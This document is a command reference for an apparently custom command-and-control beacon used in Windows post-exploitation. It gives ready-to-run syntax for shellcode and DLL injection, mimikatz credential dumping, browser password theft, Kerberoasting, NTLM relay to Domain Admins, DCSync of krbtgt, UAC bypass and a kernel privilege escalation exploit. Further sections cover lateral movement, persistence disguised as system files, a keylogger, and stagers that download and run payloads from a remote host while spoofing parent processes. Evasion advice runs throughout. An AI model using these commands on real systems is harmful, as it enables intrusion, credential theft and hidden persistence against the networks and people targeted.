Beacon Command Reference

All commands are queued and executed by the beacon in order.

Filesystem

CommandArgumentsDescription
pwdCurrent working directory of the beacon process.
cd<path>Change working directory.
ls[path]List files; without argument — current directory.
rm<path>Delete a file or directory.
cp<src> <dst>Copy a file.
mv<src> <dst>Move or rename (replaces destination if it exists).
download<remote> <local>Download a file from the target and save locally.
upload<local> <remote>Upload a local file to the target.

Code Execution

shell<cmd>One-shot cmd.exe /c <cmd>.
shell(no argument)Enter interactive cmd.exe.
run<cmdline>Start a process directly, without cmd.exe.
psProcess list.

Shellcode Injection

inject<pid> <file> Execute shellcode in another process.
inject_apc<pid> <file> APC injection to all threads of PID.
spawnto<file> [path] Sacrificial process: launch a sacrifice process and execute shellcode in it. Default sacrifice process name — rundll32.exe.
modstomp<file> [dll] Module stomping: load a signed module and execute shellcode in its memory.

Inject DLL (Reflective Loading)

inject_dll<dll_path> [args...] Fork & Run: a sacrificial process is launched, the DLL is reflectively loaded inside it. If arguments are passed — a mimikatz export is called and output is captured to the operator console.
inject_dll<dll_path> --spawnto <PID> [args...] Inject into an existing process: the DLL is reflectively loaded directly into the address space of <PID>, output is captured via a named pipe.

Unlike inject/spawnto (which run shellcode), inject_dll loads an arbitrary PE DLL entirely into memory: maps the image, fixes relocations, resolves imports, and calls the specified export.

Privileges

ScenarioToken the DLL runs withAccess to LSASS
Fork & Run Beacon's token (inherited by the sacrificial process). Yes, if the beacon has SeDebugPrivilege.
--spawnto <PID> Token of the target process. Only if SeDebugPrivilege is present in that token; most Medium IL user processes do not have it.
The most direct path to sekurlsa::logonpasswords: privesc_admin → fork & run. The sacrificial process inherits the beacon's High IL token; mimikatz opens LSASS without issues. PID injection without privesc will almost always hit ERROR_ACCESS_DENIED (0x05) inside kuhl_m_sekurlsa_acquireLSA.

Examples

# Mimikatz fork & run (requires SeDebug on the beacon)
inject_dll bof\bibikatz\powerkatz.dll sekurlsa::logonpasswords exit
inject_dll bof\bibikatz\powerkatz.dll lsadump::sam exit
inject_dll bof\bibikatz\powerkatz.dll "kerberos::list /export" exit

# Arbitrary DLL — the DLL entry point will be called
inject_dll C:\payloads\my_dll.dll

# PID injection (requires write access to the target's address space)
inject_dll bof\bibikatz\powerkatz.dll --spawnto 4128 sekurlsa::logonpasswords exit
The DLL is read from the operator's disk and sent into the session — the file never exists on the target machine; the image lives only in the memory of the sacrificial/target process. After the export finishes in fork & run the sacrificial process is destroyed; in PID mode the target process stays alive — the operator should take this into account.

Migrate

migrate<pid> Reflective migration of the beacon into the target process. The current beacon packs its image into a payload, injects it into <pid>, waits for the new beacon to check in on the teamserver, and terminates the old process.

Unlike inject, migrate moves the beacon itself, not arbitrary shellcode: the new process inherits the current session, sleep/jitter settings, and accumulated data. In Sessions the old row is marked dead; the new one appears with the same beacon_id.

The PID target must be compatible by architecture (x64) and integrity level (cannot migrate from Medium IL to System without a prior steal_token/privesc_*). If the current token lacks SeDebugPrivilege, migration into another process will fail with an access error.

BOF (Beacon Object Files)

bof<name> [entry] [-- fmt arg1 arg2 ...] Load a COFF into memory and call the entry point (default: go).

Automatic File Search

If the file is not found at the specified path, the client recursively searches for it in the bof/ directory. The .o extension may be omitted.

bof whoami.x64.o                        — search by name
bof whoami                              — tries .o, .x64.o, .x86.o
bof bofalf-bof\SAL-BOF\whoami.x64.o  — full path

Arguments

After -- specify a format string and values:

SymbolType
iint32
sint16
zANSI string
ZWide string (UTF-16)
bBinary file
bof printspoofer go -- iZ 0 "cmd.exe /c whoami"

Compatible with the Cobalt Strike BOF API. External DLL functions (KERNEL32, MSVCRT, etc.) are loaded automatically.

Execute-Assembly (.NET)

execute-assembly<path.exe> [args...] Load a .NET assembly from the operator's disk and execute it in the beacon process via CLR hosting.

The assembly is transferred as bytes into memory — no file is created on the target disk.

Loading the CLR runtime exposes the process as a .NET host. Recommended: spawnto + execute-assembly in a child process.

Pivot and Relay Chains

CommandArgumentsDescription
tcp_pivot<host> <port> Open a raw TCP channel to a pivot listener on the teamserver. Allows a beacon in an isolated segment to reach the teamserver through an intermediary beacon.

Multi-hop Chains (relay chain)

Co2H supports arbitrarily deep chains:

Machine3 ─TCP pivot─> Machine2 ─TCP pivot─> Machine1 ─HTTPS─> teamserver

Each "parent" beacon automatically becomes a TCP relay for "child" beacons. The server recursively unpacks nested relay frames and routes data to the correct beacon by beacon_id. The operator sees all three beacons as independent sessions in the Sessions table and can issue tasks to each in the normal way.

Setting up a 3-hop chain:
1. Machine1 already has an HTTPS beacon; a TCP listener is active on the teamserver (e.g. port 4444).
2. On Machine1, create a TCP Pivot listener via UI: Listeners → New → Pivot → port 5555.
3. On Machine2, start a beacon with TCP transport pointing to machine1:5555. Machine2's beacon will appear in Sessions.
4. On Machine2, similarly create a pivot listener (port 6666).
5. On Machine3, start a beacon → machine2:6666. Machine3's beacon will appear.

Limitation: each beacon relay in the chain adds RTT; with sleep 0 all three hops execute tasks in real time. Recommended sleep of at least 500 ms on intermediate beacons to avoid TCP buffer overflow.

Tokens and Privileges

CommandArgumentsDescription
getuidCurrent user / SID.
steal_token<pid> Duplicate the token of the specified process. After execution, shell and run launch child processes as the owner of the duplicated token, not as the beacon process. Network requests are also made with the duplicated credential. Requires SeDebugPrivilege.
priv_all Enable all privileges present in the current token. By default Windows leaves most privileges disabled, even if they are part of the token.
Typical workflow:
steal_token <pid> → priv_all → commands run with the full privilege set (SeLoadDriverPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, etc.).
make_token<DOMAIN\user> <pass> Create a network token with the specified credentials. Applies to outbound network requests and child processes (similar to steal_token).
rev2self Drop impersonation. Child processes will again run as the beacon process.
Important: steal_token changes the identity for child processes (shell, run) and for network requests, but does not change the primary token of the beacon process itself. The USER column in the Sessions table will still show the original user — this is expected behavior.

Typical path to SYSTEM:
steal_token 564  (winlogon.exe)
priv_all
shell whoami /all  → shows NT AUTHORITY\SYSTEM with all privileges enabled

Credential Dumping

hashdump

CommandArgumentsDescription
hashdump Enables SeBackupPrivilege and saves the SAM, SYSTEM, SECURITY registry hives to %TEMP%\sam.hiv / system.hiv / security.hiv. Retrieve the files with download and parse offline.
Requires SYSTEM or an elevated process with SeBackupPrivilege.
Offline parsing:
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
mimikatz lsadump::sam /system:system.hiv /sam:sam.hiv

edge_creds

CommandArgumentsDescription
edge_creds Extract saved passwords from the memory of the msedge.exe process.

Microsoft Edge stores all saved passwords in plaintext in the browser process heap, even if the user has not visited those sites in the current session. Microsoft classifies this as intended behaviour.

Mechanism:

  1. Enumerate processes via CreateToolhelp32Snapshot → find msedge.exe
  2. OpenProcess(PROCESS_VM_READ) — read under the current user
  3. VirtualQueryEx + ReadProcessMemory — scan committed pages
  4. Search for pattern: URL\0scheme\0username\0password\0 in the heap

Output format:

  URL:  https://example.com/login
  User: user@example.com
  Pass: P@ssw0rd123
Privileges: no elevation required — works as the current user (the same one who launched Edge).
Detection: ReadProcessMemory may trigger EDR hooks on cross-process reads. Some EPP products monitor access to browser processes.

Kerberos Tickets

All ticket commands operate via the Kerberos SSP in the current logon session. SYSTEM rights are not required.

CommandArgumentsDescription
ticket_list List all tickets in the current session: ServerName @ Realm, EncryptionType.
ticket_dump[spn] Extract a ticket as a base64-encoded .kirbi. Without argument — TGT (krbtgt/REALM). With argument — service ticket for a SPN, e.g. cifs/dc01.corp.local.
ticket_use<base64> Pass-the-ticket: import a .kirbi (base64) into the current session cache. Compatible with mimikatz kerberos::ptt and Rubeus.
ticket_purge Clear the entire ticket cache of the current session.
Pass-the-ticket scenario:
1. ticket_dump cifs/fileserver.corp.local → get base64
2. Add to Credentials store (kind: ticket) for storage
3. On another beacon: ticket_use <base64>
4. ls \\fileserver\share — access with the foreign ticket

Kerberoasting

Enumerates via LDAP all accounts with a non-empty servicePrincipalName and requests a TGS ticket for each. The encrypted part of the ticket is output in hashcat format without touching LSASS.

CommandArgumentsDescription
kerberoast [domain] Without argument — domain from environment variable. With argument — uses the specified domain. Finds active accounts with an SPN via LDAP.
Requirements: any domain session (no DA rights required).

Typical scenario:
kerberoast CORP.LOCAL
→ output for RC4 accounts:
$krb5tgs$23$*svc_sql*CORP.LOCAL*MSSQLSvc/sql01:1433*<checksum>$<data>

Cracking:
hashcat -m 13100 hashes.txt wordlist.txt — RC4 (etype 23)
hashcat -m 19600 hashes.txt wordlist.txt — AES-128 (etype 17)
hashcat -m 19700 hashes.txt wordlist.txt — AES-256 (etype 18)

AES-256 hashes crack significantly slower — prioritize accounts with adminCount=1 or stale ones (pwdLastSet > 180 days).

After cracking the password — make_token CORP\svc_sql <password> or dcsync CORP.LOCAL svc_sql for the NT hash.

NTLM Relay / Coercion

Both commands start an internal NTLM relay server on the beacon machine, coerce the target to authenticate via MS-EFSR, and relay the credentials to the DC's LDAP port.

CommandArgumentsDescription
ldap_addda <dc_ip> <beacon_ip> <user_dn> <group_dn> [port=445] Coerce DC → relay its NTLM to LDAP → perform AddMember — adds user_dn to group group_dn (e.g. CN=Domain Admins,CN=Users,DC=…). Requires an account that can self-coerce the DC (usually any domain user on an unpatched host).
ldap_rbcd <dc_ip> <beacon_ip> <coerce_ip> <target_dn> <attacker_sid> [port=445] Coerce coerce_ip → relay to DC LDAP → write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to target_dn (Resource-Based Constrained Delegation). Afterward the attacker account can request an S4U2proxy ticket for any service on the target.
Typical ldap_addda scenario:
ldap_addda 192.168.1.1 192.168.1.50 "CN=jdoe,CN=Users,DC=corp,DC=local" "CN=Domain Admins,CN=Users,DC=corp,DC=local"

Typical ldap_rbcd scenario:
ldap_rbcd 192.168.1.1 192.168.1.50 192.168.1.10 "CN=fileserver,CN=Computers,DC=corp,DC=local" S-1-5-21-…-1234

MS-EFSR coercion works against unpatched systems (without KB5005413/KB5005565). LDAP relay requires the absence of LDAP signing (Required by default on modern DCs).

DCSync (MS-DRSR)

Replicates user secrets directly from the DC via the MS-DRSR protocol. Does not touch LSASS — RPC only. Output in secretsdump format.

CommandArgumentsDescription
dcsync <domain> <username> Retrieve the NT hash of a user via MS-DRSR replication. Authentication: Kerberos (fallback NTLM), encrypted transport.
Token requirements: Domain Admin or explicit DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights on the domain NC.

Typical path:
steal_token <PID of DA process>
dcsync CORP.LOCAL Administrator
dcsync CORP.LOCAL krbtgt ← golden ticket

Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT hash>:::

Using the hash (PTH):
make_token CORP\Administrator /ntlm:<NT hash>

If it outputs no_session_key — session key retrieval problem (occurs with NTLM). Works reliably with Kerberos.

ADCS Enumeration (ESC1-16)

Scanner for Active Directory Certificate Services misconfigurations. Without admin rights, finds vulnerable certificate templates, misconfigured certificate authorities, weak mapping rules on DCs, and accessible Web Enrollment. Covers 14 vulnerability classes in the ESC family.

CommandArgumentsDescription
adcs_enum [domain] Without argument — current domain. With argument — specified domain. The nearest domain controller is selected automatically.

What Is Checked

ESCWhat Is Searched For
ESC1 Template allows the client to specify an arbitrary SAN (UPN/DNS) and has an EKU for authentication (Client Auth, Smart Card Logon, PKINIT). A low-privileged user can enroll → issue a certificate for any domain account.
ESC2 Template issues a certificate with Any Purpose EKU or no EKU restrictions at all. Low-privileged enroll → certificate is suitable for forging anything.
ESC3 Template with EKU Certificate Request Agent. Allows signing requests on behalf of others (enroll-on-behalf-of) and issuing certificates for other users.
ESC4 A non-admin principal has rights to modify the template (GenericWrite, WriteDACL, WriteOwner, etc.). The attacker can turn the template into ESC1 themselves.
ESC5 A non-admin has write access to PKI infrastructure containers in AD (Public Key Services, NTAuth, root CAs). Full control over PKI.
ESC6 The CA has a mode enabled where it accepts alternative names directly from request attributes. Any template becomes equivalent to ESC1.
ESC7 A non-admin has write rights on the CA AD object. Modification of templates and CA parameters is possible.
ESC8 Web Enrollment endpoint (/certsrv/) is accessible via HTTP/HTTPS. HTTP 401 indicates a possible NTLM relay.
ESC9 Template issues a certificate without a SID extension. Bypasses mandatory strong binding (introduced by KB5014754) and allows ESC1 on modern DCs.
ESC10 The domain controller has weakened certificate-to-user mapping rules — the DC accepts weak UPN binding even without a SID extension.
ESC11 The CA does not enforce mandatory encryption of RPC certificate issuance requests. Relay is possible via coercion.
ESC13 The template's application policy is linked to an AD security group. Obtaining a certificate from such a template automatically grants membership in that group.
ESC15
(EKUwu)		 Old-format template (schema v1) allowing the client to specify SAN (CVE-2024-49019). V1 does not validate EKU from the request — the client can supply arbitrary application policies.
ESC16 The CA globally has SID extension addition disabled. All issued certificates bypass strong binding.
Requirements: any domain session (no DA rights). Some checks access the registry of the CA and domain controller — they require the Remote Registry service on those machines (or the beacon must be running on them). If registry access is unavailable these checks are silently skipped.

Typical scenario:
adcs_enum — current domain
adcs_enum corp.local — explicit specification

Example output:
[ESC1] WebServer-Vuln
       Flag:   CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (arbitrary SAN)
       EKU:    Client Authentication
       Enroll: CORP\Domain Users (Enroll)

Templates that exist in AD but are not published on any CA are flagged separately — the CA will reject the request; exploitation is not possible.

Not covered: ESC12 (offline scenario with hardware HSM, not applicable to network enumeration) and ESC14 (Samba-specific, not reproducible on Microsoft CA).

Lateral Movement

All four commands execute a command on a remote host with the rights of the beacon's current token. Output is read via \\target\ADMIN$\Temp\<rand>.tmp (except winrmexec, which uses its own WinRM transport).

CommandArgumentsDescription
psexec_cmd <target> <command> Creates a temporary Windows service on the target, executes the command, reads output via UNC, and removes the service.
Requires Local Admin + SCM rights.
wmiexec <target> <command> Runs the command via WMI Win32_Process::Create. Does not create a service — quieter than psexec.
Requires Local Admin on the target.
dcomexec <target> <command> Runs the command via the remote DCOM object MMC20.Application.
Does not require an active user session. Uses port 135 (DCOM endpoint mapper).
Requires Local Admin on the target.
winrmexec <target> <command> Connects to http://target:5985/wsman and executes the command via WinRM.
Requires WinRM HTTP (port 5985) + Local Admin on the target.
Enable WinRM on target: winrm quickconfig.
Typical scenario:
steal_token <PID with LocalAdmin token>
psexec_cmd 192.168.1.20 whoami
wmiexec fileserver.corp.local ipconfig /all
dcomexec 192.168.1.20 "net user hacker P@ssw0rd! /add"
winrmexec 192.168.1.20 hostname

Ports:
  • psexec_cmd, wmiexec, dcomexec — 445 (SMB for ADMIN$) + 135/dynamic (DCOM/WMI/SCM)
  • winrmexec — 5985 (HTTP) or 5986 (HTTPS)
Enable WinRM on target:
winrm quickconfig -q

Output wait timeout: psexec/wmi/dcom — 15 s, winrm — 30 s.

Port Forward

Opens a TCP listener on the beacon machine and transparently proxies each incoming connection to a specified remote host and port. Runs in a background thread — the beacon continues accepting tasks. Up to 8 rules are supported simultaneously.

CommandArgumentsDescription
portfwd add <lport> <rhost> <rport> Create a rule: listen on 0.0.0.0:lport, forward each connection to rhost:rport.
portfwd del <lport> Delete a rule: close the listener, terminate all existing proxied connections.
portfwd list (or just portfwd) Show the list of active rules.
Scenario: access RDP behind the beacon
portfwd add 13389 10.10.10.5 3389
mstsc /v:beacon-ip:13389

Scenario: tunnel to an internal web server
portfwd add 18080 internal-app.corp.local 80
curl http://beacon-ip:18080/

Reverse Port Forward

The teamserver opens a TCP port (bind); on incoming connections traffic goes through the C2 channel to the beacon, which forwards it to rhost:rport. Architecturally — the mirror of SOCKS5: the client connects to the teamserver, not to the operator's proxy client.

How to createDescription
Sessions → right-click → Start Reverse Port Forward… Dialog: Bind host and Bind port — what the teamserver opens; Rhost and Rport — the target the beacon connects to. After clicking OK the teamserver starts listening. On the first incoming connection the beacon establishes a connection to rhost:rport.
Traffic flow:
external client → teamserver:bind_port → (C2 channel) → beacon → rhost:rport

Example — access to an internal web server through the teamserver:
Bind host: 0.0.0.0, Bind port: 8080, Rhost: internal-webapp.corp.local, Rport: 80
curl http://teamserver-ip:8080/

Difference from SOCKS5: SOCKS5 tunnels arbitrary traffic through the polling loop; rportfwd opens a specific port directly on the teamserver, requires no SOCKS5 client, and works for any TCP protocol.

Screenshot

CommandArgumentsDescription

The file is saved to the operator's desktop as
%USERPROFILE%\Desktop\screenshot_<beaconId>_<timestamp>.bmp

Privilege Escalation

CommandArgumentsDescription
privesc_admin UAC bypass via registry key hijack in HKCU. The current executable is re-launched with High Integrity. The registry key is deleted after launch.
privesc_system Steals the winlogon.exe token and launches a new beacon instance as SYSTEM in the active console session. Requires SeDebugPrivilege (elevated process or Administrator).
privesc_plasma Elevates directly from a standard user to SYSTEM without an intermediate Administrator/UAC step. Exploits CVE-2020-17103 (race condition in CfAbortOperation, Cloud Files component). Requires no privileges — works from Medium Integrity Level. Result: a new beacon as NT AUTHORITY\SYSTEM in the current user session.

privesc_plasma — Details

The command performs a multi-stage attack (3 stages), fully automated. Each stage runs as a separate child process with a 30-second timeout.

Requirements:

  • Windows 10 versions 1903–20H2 (Cloud Files API is available and vulnerable).
  • No privileges needed — a standard user (Medium IL) is sufficient.
  • The Cloud Files component (cldapi.dll) must be loadable.

Result: a new beacon with user = SYSTEM appears in the Sessions table, bound to the current session (SessionId is preserved).

Creates several child processes (stages 1–3), temporary directories in %TEMP%, and calls schtasks.exe. May be detected by: unusual entry in Volatile Environment, a non-standard wermgr.exe outside C:\Windows\System32, a WER task running outside its normal context.

Persistence

Three autorun mechanisms on the target side: Run registry key, Scheduled Task, and WMI event subscription. Registry and Task Scheduler work in the current user's context without admin rights. WMI subscription requires Local Admin and fires even without a user login.

CommandArgumentsDescription
persist_reg <name> <path> Writes a value to HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Autorun on every login of the current user.
persist_task <name> <path> Creates a Scheduled Task via the Task Scheduler API. Trigger: Logon. Hidden, no privilege elevation, runs when network is available.
persist_wmi <name> <interval_sec> <exe_path> WMI event subscription in ROOT\subscription. Creates three objects:
  • __EventFilter — fires every ~interval_sec seconds.
  • ActiveScriptEventConsumer — runs exe_path.
  • __FilterToConsumerBinding — binds the filter and consumer.
Fires every ~interval_sec seconds. Executes as SYSTEM via the WMI service. Requires Local Admin.
Removal:
wmic /namespace:\\root\subscription path __EventFilter where "Name='<name>'" delete
wmic /namespace:\\root\subscription path ActiveScriptEventConsumer where "Name='<name>'" delete
wmic /namespace:\\root\subscription path __FilterToConsumerBinding where "Filter=""__EventFilter.Name='<name>'""" delete
Examples:
persist_reg edge_update C:\Users\%USERNAME%\AppData\Local\Temp\svchost.exe
persist_task OneDriveUpdater C:\Users\%USERNAME%\AppData\Roaming\Microsoft\svchost.exe
persist_wmi WindowsUpdate 60 C:\Windows\Temp\svchost.exe

Detection:
  • Registry Run key → Sysmon event 13 (RegistryEvent)
  • Scheduled Task → Windows Security log, event 4698 (Task created)
  • WMI subscription → Sysmon events 19/20/21 (WmiEvent); also Microsoft-Windows-WMI-Activity/Operational
To reduce visibility: mask the name to look like a system one (MicrosoftEdgeUpdateCore, WindowsDefenderUpdate) and store the executable in standard system directories (%WINDIR%\Temp\, %APPDATA%\Microsoft\Windows\).

Keylogger

CommandArgumentsDescription
keylogger start Installs a system-wide keyboard hook in a background thread. All keystrokes are buffered in memory with the active window title.

Stagers (spawn via interpreter)

These commands create a delivery file on the target disk and immediately launch it via the corresponding Windows interpreter. Launch is performed with PPID spoofing: the parent of the new process becomes explorer.exe, not the beacon. The interpreter downloads the payload from the specified URL and runs it.

Process tree from the EDR's perspective:

explorer.exe
  └─ mshta.exe / wscript.exe / hh.exe / cmd.exe
       └─ payload.exe
CommandArgumentsInterpreterDescription
stager_lnk <url> <out_path> [--rm-after] cmd.exe /c start /b Creates a .lnk — target cmd.exe, arguments: download URL via PowerShell and run.
stager_hta <url> <out_path> [--rm-after] mshta.exe Creates an HTML Application (.hta). VBScript inside downloads the URL and runs the payload. Window is hidden, self-closes.
stager_vbs <url> <out_path> [--rm-after] wscript.exe //nologo //b Creates a VBScript (.vbs): downloads URL and runs payload. The //b flag — batch mode, no dialogs.
stager_wsf <url> <out_path> [--rm-after] wscript.exe //nologo //b Creates a Windows Script File (.wsf): XML wrapper around VBScript. wscript treats WSF as a valid type — fewer extension-based detections than .vbs.
stager_iso <url> <out_path> [--rm-after] powershell.exe (Mount-DiskImage) Creates an ISO image. Inside — launch.lnk. Files inside an ISO do not receive MOTW (Mark of the Web) when mounted — Defender does not mark them as "from the internet". PowerShell mounts the image and runs launch.lnk.
stager_chm <url> <out_path> [--rm-after] hh.exe Creates a CHM file via hhc.exe (HTML Help Compiler). Contents: HTML with a script that downloads and runs the payload. Requires hhc.exe on the target machine (HTML Help Workshop or Windows SDK).

The --rm-after Flag

If --rm-after is specified, the beacon deletes the file from disk 500 ms after launching the interpreter — enough time for mshta.exe / wscript.exe to read the script. Without the flag the file remains on disk; the operator can retrieve it with download or delete it manually with rm.

PPID Spoofing

Each interpreter is launched with PPID spoofing to the first found instance of explorer.exe. In Task Manager, Process Hacker, and Sysmon the parent of the process will be explorer.exe, not the beacon. If explorer.exe is unavailable (server session without GUI), the launch proceeds without spoofing.

Examples:
stager_hta http://192.168.1.10:8080/s.exe C:\Temp\upd.hta --rm-after
stager_vbs http://192.168.1.10:8080/s.exe C:\ProgramData\svc.vbs --rm-after
stager_wsf http://192.168.1.10:8080/s.exe "%APPDATA%\Microsoft\upd.wsf" --rm-after
stager_lnk http://192.168.1.10:8080/s.exe "C:\Users\Public\doc.lnk"
stager_iso http://192.168.1.10:8080/s.exe C:\Temp\archive.iso --rm-after
stager_chm http://192.168.1.10:8080/s.exe C:\Temp\help.chm --rm-after

stager_iso requirements: Windows 8+ (IMAPI2 + PowerShell Mount-DiskImage requires PS 3.0).
stager_chm requirements: hhc.exe (HTML Help Workshop) on the target machine.

Beacon Control

CommandArgumentsDescription
sleep<ms> [jitter] Callback interval in ms, jitter 0–100 %. Example: sleep 30000 20.
exit Graceful beacon shutdown. The beacon signals completion, sends a final response, and exits at the end of the current loop iteration. If the beacon is in a long sleep — waits until it wakes up.
kill Immediate destruction of the beacon process with no wait and no final response. Used when the beacon is stuck in a long operation or when a guaranteed quick kill is needed. After kill the session in Sessions is marked as lost after the next heartbeat timeout.
